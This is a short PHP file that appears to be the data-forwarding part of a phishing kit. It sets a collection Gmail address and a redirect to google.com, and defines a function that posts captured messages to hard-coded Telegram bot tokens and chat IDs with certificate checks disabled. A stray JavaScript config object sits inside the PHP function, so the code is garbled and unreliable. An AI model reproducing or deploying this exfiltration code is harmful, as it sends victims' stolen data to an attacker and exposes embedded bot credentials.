<?php 
$Receive_email="tijobsworkers@gmail.com";
$redirect="https://www.google.com/";
function send_telegram_msg($message){
	// Put Your Telegram Information Here
	$botToken  = '8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU';
	$chat_id  = ['8179736651'];
	$website="https://api.telegram.org/bot".$botToken;
	foreach($chat_id as $ch){
		$params=[
		  'chat_id'=>$ch, 
		  'text'=>$message,
		];
		$ch = curl_init($website . '/sendMessage');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
		if (curl_errno($ch)) {
    			echo 'Erreur cURL : ' . curl_error($ch);
		}
		curl_close($ch);

	}
	return true;
	var telegramConfig = {
    botToken: '7747875587:AAHy5xrS8OLcvUWhtDQBkcFFjhKAABeMLOU',
    chatID: '7220798994'
};

}
?>

